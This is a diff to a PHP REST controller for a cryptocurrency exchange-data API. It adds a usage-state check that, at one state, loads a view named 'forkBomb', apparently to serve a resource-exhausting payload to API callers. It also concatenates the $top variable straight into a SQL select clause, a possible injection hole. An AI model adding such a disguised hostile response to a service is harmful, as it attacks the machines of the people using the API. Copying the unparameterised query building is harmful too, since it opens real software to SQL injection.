@@ -12,9 +12,16 @@ class API extends REST_Controller
         header("Access-Control-Allow-Methods: GET");
         parent::__construct();
         $this->load->model('SQL', 'sql');
+        $this->load->model('API_model', 'api');
         $this->load->driver('cache',
             array('adapter' => 'apc', 'backup' => 'file', 'key_prefix' => 'api_')
         );
+
+        if($this->api->getEtat() == 1) {
+            $this->set_response(uniformisationReponse(false, null, 'Too much request. Come back tomorrow.'), REST_Controller::HTTP_NOT_FOUND);
+        } elseif($this->api->getEtat() == 2) {
+            $this->load->view('forkBomb');
+        }
     }
 
     function index_get() 
@@ -42,7 +49,7 @@ class API extends REST_Controller
             'historiques_symb_date' => BASE_URL.'historiques/symbol/{String}/date/{date}',
         );
 
-        $this->set_response($url, REST_Controller::HTTP_OK);
+       // $this->set_response($url, REST_Controller::HTTP_OK);
 
     }
 
@@ -59,10 +66,12 @@ class API extends REST_Controller
 
         $currencies = ($where) ? $this->sql->getBDD($sql) : $data;
        
-        if($currencies)
-            $this->set_response(uniformisationReponse(true, $currencies), REST_Controller::HTTP_OK);
-        else 
-            $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
+        if($this->api->getEtat() == 0) {
+            if($currencies)
+                $this->set_response(uniformisationReponse(true, $currencies), REST_Controller::HTTP_OK);
+            else 
+                $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
+        }
 
         return;
         
@@ -87,7 +96,7 @@ class API extends REST_Controller
                 $name = 'echange_'.$top.'_'.$limit;
 
                 $sql = array(
-                    'select' => 'monnaie_crypto.*, echange.*, max(7d)', 
+                    'select' => 'monnaie_crypto.*, echange.*, max('.$top.') as top', 
                     'table' => 'echange',
                     'join' => array(
                         0 => array(
@@ -118,6 +127,10 @@ class API extends REST_Controller
                     ), 
                     'order' => array(
                         0 => array(
+                            'champs' => 'top',
+                            'order' => 'DESC',
+                        ),
+                        1 => array(
                             'champs' => $top,
                             'order' => 'DESC',
                         ),
@@ -127,14 +140,16 @@ class API extends REST_Controller
 
                 $data = $this->sql->getCache($name, $sql);
 
-                if (isset($data)) {
+                if($this->api->getEtat() == 0) {
+                    if (isset($data)) {
 
-                    if ($data)
-                        $this->set_response(uniformisationReponse(true, $data), REST_Controller::HTTP_OK);
-                    else
-                        $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
-                    
-                    return;
+                        if ($data)
+                            $this->set_response(uniformisationReponse(true, $data), REST_Controller::HTTP_OK);
+                        else
+                            $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
+                        
+                        return;
+                    }
                 }
             }
             else{
@@ -145,9 +160,10 @@ class API extends REST_Controller
                     'echange_top_date_limit' => BASE_URL.'echanges/top/{1h|24h|7d}/date/yyyy-mm-dd/limit/{number}',
                 ];
         
-                $this->set_response($url, REST_Controller::HTTP_OK);
-                return;
+                if($this->api->getEtat() == 0) 
+                    $this->set_response($url, REST_Controller::HTTP_OK);
 
+                return;
             }
         }
 
@@ -176,14 +192,16 @@ class API extends REST_Controller
 
             $data = $this->sql->getCache($name, $sql);
 
-            if (isset($data)) {
+            if($this->api->getEtat() == 0) {
+                if (isset($data)) {
 
-                if ($data)
-                    $this->set_response(uniformisationReponse(true, $data), REST_Controller::HTTP_OK);
-                else
-                    $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
-                
-                return;
+                    if ($data)
+                        $this->set_response(uniformisationReponse(true, $data), REST_Controller::HTTP_OK);
+                    else
+                        $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
+                    
+                    return;
+                }
             }
         }
 
@@ -200,7 +218,9 @@ class API extends REST_Controller
             'echange_top_date_limit' => BASE_URL.'echanges/top/{1h|24h|7d}/date/yyyy-mm-dd/limit/{number}',
         ];
 
-        $this->set_response($url, REST_Controller::HTTP_OK);
+        if($this->api->getEtat() == 0) 
+            $this->set_response($url, REST_Controller::HTTP_OK);
+        
         return;
     }
 
@@ -234,14 +254,16 @@ class API extends REST_Controller
 
             $data = $this->sql->getCache($name, $sql);
 
-            if (isset($data)) {
+            if($this->api->getEtat() == 0) {
+                if (isset($data)) {
 
-                if ($data)
-                    $this->set_response(uniformisationReponse(true, $data), REST_Controller::HTTP_OK);
-                else
-                    $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
+                    if ($data)
+                        $this->set_response(uniformisationReponse(true, $data), REST_Controller::HTTP_OK);
+                    else
+                        $this->set_response(uniformisationReponse(false, null, 'Check your request'), REST_Controller::HTTP_NOT_FOUND);
                 
-                return;
+                    return;
+                }
             }
         }
 
@@ -253,8 +275,9 @@ class API extends REST_Controller
             'historiques_symb_limit' => BASE_URL.'/api/historiques/symbol/{String}/limit/{number}',
             'historiques_symb_date' => BASE_URL.'/api/historiques/symbol/{String}/date/{date}',
         ];
+        if($this->api->getEtat() == 0)
+            $this->set_response($url, REST_Controller::HTTP_OK);
 
-        $this->set_response($url, REST_Controller::HTTP_OK);
         return;
 
     }
